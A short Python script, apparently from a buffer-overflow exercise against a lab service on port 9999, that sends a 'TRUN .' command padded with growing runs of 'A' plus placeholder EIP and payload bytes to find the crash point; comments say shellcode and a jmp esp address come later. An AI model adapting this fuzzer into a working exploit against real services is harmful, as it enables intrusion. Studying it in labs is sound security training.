import socket

# Python fuzzer

def main():
    # set ip and port
    ip = "192.168.1.2"
    port = 9999

    # set up socket stuff
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip,port))

    # place holder for now
    # later the jmp esp command goes here
    eip = "BBBB"

    # see where these Cs go 
    # replace later with the shellcode pretty much
    payload = "C"*50

    # in order to reach the part of the code that
    # does the exploit you need to begin with this
    command = "TRUN ."

    print(sock.recv(1024).decode("utf-8"))

    for i in range(3000):
        garbage = "A"*i
        exploit_str = command + garbage + eip + payload
        
        sock.send(exploit_str.encode("utf-8"))
        
        # get and print the response
        # when it finally crashes this is where we will be stopped
        print(sock.recv(1024).decode("utf-8"))
        



if __name__ == "__main__":
    main()